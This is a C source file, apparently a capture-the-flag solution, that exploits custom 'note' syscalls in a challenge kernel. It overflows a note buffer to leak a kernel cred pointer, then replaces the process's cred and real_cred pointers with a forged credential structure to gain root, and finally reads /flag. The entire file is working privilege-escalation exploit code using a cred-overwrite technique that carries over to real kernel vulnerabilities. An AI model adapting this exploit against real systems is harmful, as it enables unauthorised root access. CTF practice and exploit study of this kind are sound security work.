#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>


#define current_to_note_offset 0x6A8

#define __NR_add_note 548
#define __NR_delete_note 549
#define __NR_show_note 550
#define __NR_copy_note 551
#define __NR_current_addr 552

long add_note(char *s)
{
    return syscall(__NR_add_note, s);
}

long delete_note()
{
    return syscall(__NR_delete_note);
}

long show_note(char *s)
{
    return syscall(__NR_show_note, s);
}

long copy_note(char *s)
{
    return syscall(__NR_copy_note, s);
}

unsigned long long current_addr()
{
    return syscall(__NR_current_addr);
}

char *p64(unsigned long long a)
{
    int i=0;
    char *s = malloc(8);
    for (i=0; i<8; i++){
        s[i] = (a >> i*8) & 0xff;
    }
    return s;
}

unsigned long long u64(unsigned char *s)
{
    unsigned long long a = 0;
    int i=0;
    for (i=0; i<8; i++)
    {
        a = a | (unsigned long long) (*(s + i)) << 8 * i;
    }
    return a;
}

void hexdump(const void *data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i)
    {
        printf("%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
        {
            ascii[i % 16] = ((unsigned char *)data)[i];
        }
        else
        {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size)
        {
            printf(" ");
            if ((i + 1) % 16 == 0)
            {
                printf("|  %s \n", ascii);
            }
            else if (i + 1 == size)
            {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8)
                {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}


int main(int argc, char *argv[])
{

    char a[4096];
    char flag[1024];

    unsigned long long current;
    unsigned long long cred_addr;
    unsigned long long note_addr;

    current = current_addr();
    note_addr = current + current_to_note_offset;
    printf("current addr: 0x%llx\n", current);
    
    memset(a, 0x0, 4096);
    memset(a, 0x41, 1032);    
    add_note(a);
    show_note(a);

    cred_addr = u64(a+1032);
    printf("cred addr: 0x%llx\n", cred_addr);

    if(cred_addr < 0xffff00000000){
        printf("ex failed\n");
        return 0;
    }
    
    char *usage = p64(0x2);

    char *fake_cred = p64(note_addr);
    char *fake_security = p64(note_addr + 0xa8);
    char *fake_user = p64(note_addr + 0xa8*2);
    char *fake_user_ns = p64(note_addr + 0xa8*3);
    char *fake_group_info = p64(note_addr + 0xa8*4);
    
    memset(a, 0x0, 4096);
    memset(a, 0x41, 1032);
    memcpy(a+1032, fake_cred, 8);
    memcpy(a+1040, fake_cred, 8);

    memset(a+1048, 0x0, 4096-1048);
    add_note(a);

    memset(a, 0x0, 1024);
    memcpy(a, usage, 8);

    memcpy(a+0x78, fake_security, 8);
    memcpy(a+0x78+8, fake_user, 8);
    memcpy(a+0x78+16, fake_user_ns, 8);
    memcpy(a+0x78+24, fake_group_info, 8);
    memcpy(a+0xa8*2, usage, 8);
    copy_note(a);
    
    FILE *fp;
    fp = fopen("/flag", "r");    
    fread(flag, 1, 1024, fp);
    printf("Flag: %s\n", flag);    

    return 0;
}

